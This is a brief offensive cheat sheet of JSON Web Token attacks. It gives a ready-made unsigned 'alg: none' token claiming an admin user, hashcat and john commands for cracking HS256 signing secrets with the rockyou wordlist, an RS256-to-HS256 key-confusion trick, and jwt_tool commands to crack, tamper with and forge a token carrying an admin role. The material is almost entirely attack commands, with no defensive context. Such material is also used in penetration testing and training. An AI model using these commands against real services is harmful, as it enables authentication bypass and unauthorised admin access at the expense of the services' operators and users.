JWT Attack Techniques
Attack 1: None Algorithm
Change "alg": "HS256" → "alg": "none"
Remove signature entirely (keep trailing dot)
eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ.
Attack 2: HS256 with weak secret
hashcat -a 0 -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt
john --wordlist=rockyou.txt --format=HMAC-SHA256 jwt.txt
Attack 3: RS256 → HS256 (key confusion)
# If server uses RS256, try signing with HS256 using the public key as secret
python3 jwt_tool.py TOKEN -X k -pk public.pem 
# jwt_tool — Swiss army knife for JWT
python3 jwt_tool.py TOKEN --crack -d wordlist.txt   # Crack secret
python3 jwt_tool.py TOKEN -T                        # Tamper mode
python3 jwt_tool.py TOKEN -X a                      # alg:none attack
python3 jwt_tool.py TOKEN -I -pc role -pv admin -S hs256 -p secret  # Forge
